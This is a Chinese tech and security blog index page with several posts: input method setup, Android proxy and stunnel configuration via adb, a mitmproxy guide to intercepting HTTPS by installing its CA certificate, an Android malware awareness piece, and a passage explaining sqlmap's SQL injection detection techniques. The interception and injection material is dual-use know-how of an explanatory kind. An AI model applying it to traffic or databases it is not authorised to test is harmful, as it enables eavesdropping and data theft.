<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 垂直候选列表</span></span><br><span class="line"><span class="string">Vertical</span> <span class="string">Candidate</span> <span class="string">List=False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按屏幕 DPI 使用</span></span><br><span class="line"><span class="string">PerScreenDPI=True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Font (设置成你喜欢的字体)</span></span><br><span class="line"><span class="string">Font=&quot;Smartisan</span> <span class="string">Compact</span> <span class="string">CNS</span> <span class="number">13</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 主题(这里要改成你想要使用的主题名，主题名就在下面)</span></span><br><span class="line"><span class="string">Theme=spring</span></span><br></pre></td></tr></table></figure>

<p>另外还有一款 fcitx5 皮肤相对流行：<a target="_blank" rel="noopener" href="https://github.com/hosxy/Fcitx5-Material-Color">https://github.com/hosxy/Fcitx5-Material-Color</a></p>
<p>切换皮肤的方法是，点击鼠标右键点击 配置 -&gt; 附加组件 -&gt; 经典用户界面 -&gt; 点击右边图标 -&gt; 选择皮肤</p>
<h2 id="设置-fcitx-rime-单行模式"><a href="#设置-fcitx-rime-单行模式" class="headerlink" title="设置 fcitx rime 单行模式"></a>设置 fcitx rime 单行模式</h2><p>如果要将输入法设置为单行模式，需要修改配置文件 <code>~/.config/fcitx5/conf/rime.conf</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PreeditInApplication=True</span></span><br></pre></td></tr></table></figure>

<p>或者按快捷键 <code>ctrl + alt + p</code>, 这个快捷键可以来回切换很方便，单行还是双行就因人而异了，我个人觉得单行好点。</p>
<h2 id="让-fcitx5-正确显示菜单"><a href="#让-fcitx5-正确显示菜单" class="headerlink" title="让 fcitx5 正确显示菜单"></a>让 fcitx5 正确显示菜单</h2><p>要做这个步骤是因为 rime 有 「部署」、「同步」这几个操作按钮，如果不正确配置的话在 fcitx5 上没法正常显示。<br>fcitx5 在任务上有个托盘图标，点击右键就可以看到这些菜单。</p>
<p>要让 fcitx 正确显示菜单，关键在于让 rime 输入法默认处于激活状态，根据 fcitx5 配置的提示第一个输入法为非激活状态。</p>
<ul>
<li>（1） 将第一个输入法设置为  键盘-英语 （美国），第二个输入法设置为 中州韵</li>
<li>（2） 在全局设置中，勾上默认状态为激活，共享输入状态设置为 <code>程序</code></li>
</ul>
<h2 id="fcitx-vim"><a href="#fcitx-vim" class="headerlink" title="fcitx.vim"></a>fcitx.vim</h2><p>这个章节是写给 linux vim 用户看的，没有此需求的可以直接跳过这段。</p>
<p>vim 确实是程序编辑的利器，但是在用vim 写中文文档的时候，有一个痛点，你在用 fcitx 写中文的时候想保存文档，<br>vim 必须切换到 normal 模式才能输入保存的命令 <code>:w</code>，进入normal 模式的方法是连续按两下 ESC，好了现在你应该<br>输入命令了，但是你没法输入你现在还在打中文呢，没有办法你必须先切换到英文输入法，然后才能正确地输入 <code>:w</code> 痛苦啊。</p>
<p>fcitx.vim 就是为解决这个痛点而生的插件，个人觉得这是vim 必装的几个插件之一。fcitx.vim 的github 仓库<br>地址为：<a target="_blank" rel="noopener" href="https://github.com/lilydjwg/fcitx.vim">https://github.com/lilydjwg/fcitx.vim</a></p>
<p>值得一提的是这个仓库有两个分支，fcitx4 分支 和 fcitx5 分支，使用的时候一定要分清楚，这两个分支如果<br>使用错了，就没法正常使用 fcitx.vim 插件了。fcitx4 和 fcitx5 dbus 对象名字有变化，导致代码通用性不好。<br>现在默认分支为 fcitx5，如果你使用 fcitx4 可能直接 git clone 下来就会发现插件用不了，我也是因为这个<br>原因才发现 fcitx 居然更新了。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>可能有些人不知道为什么要折腾 rime，rime 的用户词库文件是个宝贝，这个词库是都是你真实的在日常使用中用到的词库，小巧又实用还能到处同步，上传到云后永不丢失，符合自己的数据自己掌握的硬道理。至于国内的那些输入法，我就不加以评价了，在这商业的社会要保持基本的做人底线不易。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a target="_blank" rel="noopener" href="https://xuthus.cc/misc/fedora-install-fcitx5.html">https://xuthus.cc/misc/fedora-install-fcitx5.html</a></li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/android_stunnel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/android_stunnel/" class="post-title-link" itemprop="url">在 Android 手机上的使用 stunnel  （不需要 root ）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-24 00:00:00" itemprop="dateCreated datePublished" datetime="2021-02-24T00:00:00+08:00">2021-02-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-03-27 00:00:00" itemprop="dateModified" datetime="2023-03-27T00:00:00+08:00">2023-03-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="☆-Android-stunnel"><a href="#☆-Android-stunnel" class="headerlink" title="☆ Android stunnel"></a>☆ Android stunnel</h2><p><a target="_blank" rel="noopener" href="https://github.com/comp500/SSLSocks.git">https://github.com/comp500/SSLSocks.git</a>  这个项目可以使用 android 版本的 stunnel, 其实就是调用 <a target="_blank" rel="noopener" href="https://www.stunnel.org/downloads/stunnel-5.57-android.zip">https://www.stunnel.org/downloads/stunnel-5.57-android.zip</a></p>
<p>具体配置和使用命令行差距不大，参考：<br><a target="_blank" rel="noopener" href="https://github.com/comp500/SSLSocks/blob/master/README.md">https://github.com/comp500/SSLSocks/blob/master/README.md</a><br><a target="_blank" rel="noopener" href="https://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/">https://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/</a></p>
<h2 id="☆-设置全局代理"><a href="#☆-设置全局代理" class="headerlink" title="☆ 设置全局代理"></a>☆ 设置全局代理</h2><ol>
<li>在 wifi 连接的情况</li>
</ol>
<p>打开wifi 列表 -&gt; 长按连接的 wifi  -&gt; 点击修改 -&gt; 高级选项 -&gt; 填写代理相关信息</p>
<ol start="2">
<li>使用 adb shell 执行命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy 192.168.xx.xxx:8888</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Android Proxy Toggle</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://github.com/theappbusiness/android-proxy-toggle.git">https://github.com/theappbusiness/android-proxy-toggle.git</a></p>
<p>要正常使用 app 需要用 adb shell 连接上设置相应的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm grant com.kinandcarta.create.proxytoggle android.permission.WRITE_SECURE_SETTINGS</span><br></pre></td></tr></table></figure>

<p>OnePlus 7T 升级到 Android 12 后，执行上面的命令将出错:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">OnePlus7T:/ $ pm grant com.kinandcarta.create.proxytoggle android.permission.WRITE_SECURE_SETTINGS</span><br><span class="line"></span><br><span class="line">Exception occurred while executing &#x27;grant&#x27;:</span><br><span class="line">java.lang.SecurityException: grantRuntimePermission: Neither user 2000 nor current process has android.permission.GRANT_RUNTIME_PERMISSIONS.</span><br><span class="line">        at android.app.ContextImpl.enforce(ContextImpl.java:2187)</span><br><span class="line">        at android.app.ContextImpl.enforceCallingOrSelfPermission(ContextImpl.java:2215)</span><br><span class="line">        at com.android.server.pm.permission.PermissionManagerService.grantRuntimePermissionInternal(PermissionManagerService.java:1477)</span><br><span class="line">        at com.android.server.pm.permission.PermissionManagerService.grantRuntimePermission(PermissionManagerService.java:1459)</span><br><span class="line">        at android.permission.PermissionManager.grantRuntimePermission(PermissionManager.java:378)</span><br><span class="line">        at com.android.server.pm.PackageManagerShellCommand.runGrantRevokePermission(PackageManagerShellCommand.java:2419)</span><br><span class="line">        at com.android.server.pm.PackageManagerShellCommand.onCommand(PackageManagerShellCommand.java:260)</span><br><span class="line">        at com.android.modules.utils.BasicShellCommandHandler.exec(BasicShellCommandHandler.java:97)</span><br><span class="line">        at android.os.ShellCommand.exec(ShellCommand.java:38)</span><br><span class="line">        at com.android.server.pm.PackageManagerService.onShellCommand(PackageManagerService.java:25948)</span><br><span class="line">        at android.os.Binder.shellCommand(Binder.java:970)</span><br><span class="line">        at android.os.Binder.onTransact(Binder.java:854)</span><br><span class="line">        at android.content.pm.IPackageManager$Stub.onTransact(IPackageManager.java:4818)</span><br><span class="line">        at com.android.server.pm.PackageManagerService.onTransact(PackageManagerService.java:8987)</span><br><span class="line">        at android.os.Binder.execTransactInternal(Binder.java:1226)</span><br><span class="line">        at android.os.Binder.execTransact(Binder.java:1163)</span><br></pre></td></tr></table></figure>

<p>少数派的文章 <a target="_blank" rel="noopener" href="https://sspai.com/post/67110">在 ColorOS 上免 root 玩机，请先打开这个开关</a> 中指出需要在开发者选项中<br>开启 <code>禁止权限监控</code>。</p>
<p>开启后可以正常执行 <code>pm grant</code> 命令，执行成功后可以使用 <code>dumpsys package &lt;package name&gt;</code> 列出所有的权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dumpsys package com.kinandcarta.create.proxytoggle | grep permission</span><br><span class="line"></span><br><span class="line">    requested permissions:</span><br><span class="line">      android.permission.WRITE_SECURE_SETTINGS</span><br><span class="line">      android.permission.WRITE_SETTINGS</span><br><span class="line">    install permissions:</span><br><span class="line">      android.permission.WRITE_SECURE_SETTINGS: granted=true</span><br></pre></td></tr></table></figure>

<h2 id="恢复无代理"><a href="#恢复无代理" class="headerlink" title="恢复无代理"></a>恢复无代理</h2><p>如果遇上一些异常情况，比如错误卸载了 Android Proxy Toggle, 可以使用下面命令去掉 Android 全局代理。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings delete global http_proxy</span><br><span class="line">adb shell settings delete global global_http_proxy_host</span><br><span class="line">adb shell settings delete global global_http_proxy_port</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/mitmproxy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/mitmproxy/" class="post-title-link" itemprop="url">mitmproxy 简介</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-03-19 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-19T00:00:00+08:00">2020-03-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-08-29 00:00:00" itemprop="dateModified" datetime="2023-08-29T00:00:00+08:00">2023-08-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>主要特色：Intercept HTTP &amp; HTTPS requests and responses and modify them on the fly</p>
<p>使用python编写，可以在windows，Linux， Mac 下运行，这点比 fiddler 有优势。可以修改报文内容，这点很不错。</p>
<ul>
<li>官方网站： <a target="_blank" rel="noopener" href="https://www.mitmproxy.org/">https://www.mitmproxy.org/</a></li>
<li>文档：<a target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/">https://docs.mitmproxy.org/stable/</a></li>
</ul>
<h2 id="☆-1-安装"><a href="#☆-1-安装" class="headerlink" title="☆ 1. 安装"></a>☆ 1. 安装</h2><p>参考 <a target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/overview-installation/">https://docs.mitmproxy.org/stable/overview-installation/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install -y python-pip python-devel libffi-devel openssl-devel libxml2-devel libxslt-devel libpng-devel libjpeg-devel</span><br><span class="line">sudo pip install mitmproxy  <span class="comment"># or pip install --user mitmproxy</span></span><br></pre></td></tr></table></figure>
<h2 id="☆-2-基本使用"><a href="#☆-2-基本使用" class="headerlink" title="☆ 2. 基本使用"></a>☆ 2. 基本使用</h2><p><code>mitmproxy --listen-host 127.0.0.1 -p 8080</code></p>
<ul>
<li><code>--listen-host</code> address to bind address</li>
<li>-p bind port</li>
<li>-s “script.py –bar”, –script “script.py –bar”  Run a script. Surround with quotes to pass script</li>
</ul>
<h3 id="2-1-mitmproxy-界面操作"><a href="#2-1-mitmproxy-界面操作" class="headerlink" title="2.1 mitmproxy 界面操作"></a>2.1 mitmproxy 界面操作</h3><pre><code>- ？            显示帮助信息
- h, j, k, l    上下左右，同 vi
- enter         进入具体报文
- q             退出界面
- tab           详细报文内容页面
- E             导出报文内容
</code></pre>
<h2 id="☆-3-导入mitmproxy的-CA"><a href="#☆-3-导入mitmproxy的-CA" class="headerlink" title="☆ 3. 导入mitmproxy的 CA"></a>☆ 3. 导入mitmproxy的 CA</h2><p>使用mitmproxy 最大的原因就是因为它可以对付https报文。<br>参考 <a target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/concepts-certificates/">https://docs.mitmproxy.org/stable/concepts-certificates/</a></p>
<p>mitmproxy 的 CA 证书放在 ~&#x2F;.mitmproxy 目录， 可以在不同设备中添加。</p>
<h3 id="3-1-目标设备为Linux"><a href="#3-1-目标设备为Linux" class="headerlink" title="3.1 目标设备为Linux"></a>3.1 目标设备为Linux</h3><h4 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h4><ul>
<li>Google Chrome</li>
</ul>
<p>设置 -&gt; HTTPS&#x2F;SSL -&gt; 证书管理 -&gt; 授权中心</p>
<ul>
<li>Firefox</li>
</ul>
<p>没用Firefox，估计也类似。</p>
<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p>设置好CA后，设置浏览器使用mitmproxy代理即可，可以考虑使用浏览器代理插件。</p>
<h3 id="3-2-目标设备为-Android"><a href="#3-2-目标设备为-Android" class="headerlink" title="3.2 目标设备为 Android"></a>3.2 目标设备为 Android</h3><h4 id="导入证书-1"><a href="#导入证书-1" class="headerlink" title="导入证书"></a>导入证书</h4><p>adb push ~&#x2F;.mitmproxy&#x2F;mitmproxy-ca-cert.cer &#x2F;sdcard&#x2F;Download</p>
<p>设置 -&gt;  安全 -&gt; 证书存储 -&gt; 从手机存储安装， 选择上传的CA证书。</p>
<h4 id="设置代理-1"><a href="#设置代理-1" class="headerlink" title="设置代理"></a>设置代理</h4><p>emulator 上可以通过下面的命令行，设置代理。</p>
<p>.&#x2F;emulator -avd 7.0_x86 -http-proxy <a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
<p>真实的设备上，可以通过设置 wifi 代理，或者使用下面的命令行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global http_proxy 127.0.0.1:8888</span><br><span class="line">adb reverse tcp:8888 tcp:8080</span><br></pre></td></tr></table></figure>

<p>在 Android 上设置 http 全局代理 127.0.0.1:8888， 最后将 Android 的 8888 端口转发到本机 8080 端口。</p>
<h2 id="☆-4-透明模式"><a href="#☆-4-透明模式" class="headerlink" title="☆ 4. 透明模式"></a>☆ 4. 透明模式</h2><p>mitmproxy 支持透明部署，具体的方法可以参考下面的文章。</p>
<p><a target="_blank" rel="noopener" href="https://docs.mitmproxy.org/stable/howto-transparent/">https://docs.mitmproxy.org/stable/howto-transparent/</a></p>
<h2 id="☆-5-修改报文内容"><a href="#☆-5-修改报文内容" class="headerlink" title="☆ 5. 修改报文内容"></a>☆ 5. 修改报文内容</h2><p>github 上有很多例子，这次没有需求，可以参考</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mitmproxy/mitmproxy/tree/main/examples/addons">https://github.com/mitmproxy/mitmproxy/tree/main/examples/addons</a><br><a target="_blank" rel="noopener" href="https://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib">https://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib</a></p>
<p>官方文档上给了个简单例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">flow</span>):</span><br><span class="line">    flow.response.headers[<span class="string">&quot;newheader&quot;</span>] = <span class="string">&quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p>给http响应报文的头部添加一个 newheader 的字段。</p>
<h2 id="☆-6-socks-模式"><a href="#☆-6-socks-模式" class="headerlink" title="☆ 6. socks 模式"></a>☆ 6. socks 模式</h2><p>mitmproxy -m socks5</p>
<p>作为 SOCKS5 proxy server 使用</p>
<h2 id="☆-7-总结"><a href="#☆-7-总结" class="headerlink" title="☆ 7. 总结"></a>☆ 7. 总结</h2><p>这里说到的内容非常少，mitmproxy这个工具还是很强大的。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/">https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/android_malware/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/android_malware/" class="post-title-link" itemprop="url">关于恶意 Android 软件的那些事</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2018-06-05 00:00:00" itemprop="dateCreated datePublished" datetime="2018-06-05T00:00:00+08:00">2018-06-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>  近年来，Android手机平台上的恶意App呈不断上升的趋势，根据G DATA的数据仅2015年 第一季度发现了440267 种新的安卓恶意软件，也就是说，全球范围内每18秒就有一个新的恶意软件被发现。而天朝由于Google被封的原因，更是使恶意软件的传播更加猖獗。Google Play store 为了保证Android用户的安全做了大量的努力，和国内的一些第三方应用市场相比安全一些的。</p>
<p>   重打包是Android App主流的传播方式之一，和以前单独的恶意App不同，重打包的软件 在合法正常的App中插入恶意代码，迷惑性极强，一般用户觉察不出什么不同。而重打包选取 的App也大多是非常流行的App，如愤怒的小鸟之类,这些都在地下市场隐秘的进行着。重打包 App然后上传第三方App应用市场，第三方市场把关不严格的话，这些插入了恶意代码的App 就可以下载安装了。</p>
<p>  除了重打包短信，彩信也是Android 恶意App传播的主要方式，和以前QQ的消息尾巴类似发一些奇怪的话，后面加上短链接。短链接就是经过压缩的链接，没法一些看出原始的链接，点击后会自动下载恶意App。臭名昭著的“相册”就是通过这种方式传播，短信的内容是：小明，你还记得这些照片吗?  t.cn&#x2F;xyz1 注意这里的名字小明是正确的，相册偷取了大量的手机通讯录，按照通讯录的名字来发送，迷惑性大大增强了。</p>
<p>   还有值得大家注意的是，一定要警惕申请设备管理员权限的App，设备管理员可以做很多高权限的事，比如修改设备密码，擦掉数据等操作，Android手机的勒索软件就是修改了设备的密码，禁止手机主人进入手机，而进行勒索的，最近这类软件的数目增加很快，大家一定要注意。</p>
<p>  上面说了很多Android恶意软件相关的内容，也给大家一些安全建议,提高了安全意识也就不容易中招了。</p>
<ol>
<li>尽量在Google play 或者官方网站下载APP，不要第三方应用市场随意下载</li>
<li>不要随意点击不明链接</li>
<li>对于申请设备管理员的App，保持高度警惕</li>
</ol>
<p>  最后教大家一招急救，许多Android手机也有安全模式，安全模式只加载出厂应用，进入了安全模式，删除恶意软件，可能可以挽救你的手机 :)</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/chrome_flash_update/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/chrome_flash_update/" class="post-title-link" itemprop="url">Google Chrome 浏览器 Adobe Flash Player 升级</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2017-07-14 00:00:00" itemprop="dateCreated datePublished" datetime="2017-07-14T00:00:00+08:00">2017-07-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>某一天突然发现网页中flash已经不能正常显示了（我一般都禁用），显示 out of data 错误。</p>
<p>访问 chrome:&#x2F;&#x2F;components&#x2F; 可以升级 Adobe Flash Player</p>
<p>Adobe Flash Player - 检查更新， 失败。这里有一个坑，插件中的代理设置是无法影响<br>chrome 内部程序的，必须设置环境变量或者直接使用命令行来设置全局代理。</p>
<p>google-chrome —proxy-server&#x3D;”socks:&#x2F;&#x2F;127.0.0.1:9999”</p>
<p>重新检查更新，可以成功更新了，重启后生效了，已经不报 out of data 错误了。为了保险<br>把系统中flash player也给升级，打开网页 <a target="_blank" rel="noopener" href="https://get.adobe.com/flashplayer/otherversions/">https://get.adobe.com/flashplayer/otherversions/</a></p>
<p>step 1 选Linux (64 bit), step 2 选 yum，下载后安装，后续可以使用dnf 升级了。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/sqlmap_sql_injection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/sqlmap_sql_injection/" class="post-title-link" itemprop="url">sqlmap 中的 SQL Injection 检测技术</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2017-07-07 00:00:00" itemprop="dateCreated datePublished" datetime="2017-07-07T00:00:00+08:00">2017-07-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="https://github.com/henices/sqli">https://github.com/henices/sqli</a><br><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)</a></p>
<h2 id="基于信道的-sql-injection-分类"><a href="#基于信道的-sql-injection-分类" class="headerlink" title="基于信道的 sql injection 分类"></a>基于信道的 sql injection 分类</h2><h3 id="Inband"><a href="#Inband" class="headerlink" title="Inband"></a>Inband</h3><p>SQL代码注入和SQL injection 结果的获取在同一频道(e.g. 浏览器), 获得的数据直接显示在应用程序页面的正常输出或者错误信息中,这是最简单的攻击类型。</p>
<h3 id="Out-of-band"><a href="#Out-of-band" class="headerlink" title="Out-of-band"></a>Out-of-band</h3><p>SQL查询数据的传输使用不同的频道(e.g HTTP，DNS)， 这是从数据库中获取大量数据简单的方法。</p>
<h3 id="Inferential"><a href="#Inferential" class="headerlink" title="Inferential"></a>Inferential</h3><p>没用真实有用的数据传输，但是攻击者可以通过发送特定的请求，观察数据库服务器的返回的结果的行为重建信息。</p>
<h2 id="基于-sql-inject-检测技术的分类"><a href="#基于-sql-inject-检测技术的分类" class="headerlink" title="基于 sql inject 检测技术的分类"></a>基于 sql inject 检测技术的分类</h2><h3 id="boolean-based-blind-SQL-injection"><a href="#boolean-based-blind-SQL-injection" class="headerlink" title="boolean-based blind SQL injection"></a>boolean-based blind SQL injection</h3><p>也被称为推理SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，一个有效的SQL语句字符串包含 SELECT 子语句，或任何其他用户要检索输出的SQL语句。对于每个HTTP响应，将其 headers&#x2F;body和原始请求的做比较，该工具一个字符一个字符地分析的注入语句的输出。另外，用户可以提供一个字符串或正则表达式匹配正确的页面。使用SqlMap实现的二分算法来实施执行此技术可以获取七个最大的每个HTTP请求的输出的每一个字符。凡不属于输出纯文本纯字符集，SqlMap将适应与更大范围的算法来检测输出。</p>
<h3 id="error-based-SQL-injection"><a href="#error-based-SQL-injection" class="headerlink" title="error-based SQL injection"></a>error-based SQL injection</h3><p>sqlmap替换或者追加受影响的HTTP参数一个特定数据的语法错误的SQL语句，分析HTTP 响应header和body，查询DBMS错误信息中是否包含注入的预先定义的字符串链，并且SQL语句的输出在字符串链的中间.这种技术仅在web应用程序被配置成泄漏后端数据库管理系统错误信息时有效。</p>
